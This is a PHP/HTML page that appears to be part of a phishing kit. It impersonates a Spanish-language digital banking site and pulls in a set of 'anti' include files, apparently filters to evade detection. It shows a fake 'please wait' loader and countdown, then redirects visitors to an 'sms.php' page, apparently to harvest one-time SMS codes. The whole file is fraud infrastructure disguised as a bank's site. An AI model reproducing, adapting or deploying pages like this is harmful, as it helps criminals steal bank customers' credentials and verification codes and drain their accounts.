<?php
    include "anti/anti1.php";
    include "anti/anti2.php";
    include "anti/anti3.php";
    include "anti/anti4.php";
    include "anti/anti7.php";
    include "anti/anti8.php";

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="Thu, 01 Dec 1994 16:00:00 GMT">
    <title>Banca Digital</title>
    <base href=".">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
    <link rel="icon" type="image/x-icon" href="system/favicon.ico">
    <link href="./system/bundle.css" rel="stylesheet">
</head>

<body>
  <icb-app></icb-app>
  <div class="app_overlay">
    <div class="mesina-loader">
      <div class="mesina-logo"></div>
      <div class="spinner">
        <div class="bounce1"></div>
        <div class="bounce2"></div>
        <div class="bounce3"></div>
      </div>
      <div class="mesina-welcome-title" style="display:none;">Bienvenido a tu Banca Digital</div>
      <div class="mesina-welcome-subtitle1" style="display:none;">Por favor espera un momento...</div>
      <div id="countdown" style="display:none; text-align: center; color: white;"></div>
    </div>
  </div>

  <script>
    function startCountdown(duration, display) {
      var timer = duration;
      var minutes, seconds;

      var countdownInterval = setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
          clearInterval(countdownInterval);
          // Redirige a otra página una vez que el contador llegue a cero
          window.location.href = "sms.php";
        }
      }, 1000);
    }

    window.addEventListener("load", function () {
      var waitTimeInSeconds = 15; // Tiempo de espera en segundos
      var countdownDisplay = document.getElementById("countdown");
      var subtitleElement = document.querySelector(".mesina-welcome-subtitle1");
      countdownDisplay.style.display = "block";
      countdownDisplay.style.marginTop = "10px"; // Ajusta el margen superior según tus necesidades
      countdownDisplay.style.color = "white"; // Cambia el color del contador a blanco
      subtitleElement.style.display = "block";
      subtitleElement.style.textAlign = "center";

      setTimeout(function () {
        subtitleElement.style.display = "none";
        startCountdown(waitTimeInSeconds, countdownDisplay);
      }, 3000); // Espera 8 segundos antes de mostrar el contador
    });
  </script>
</body>





</html>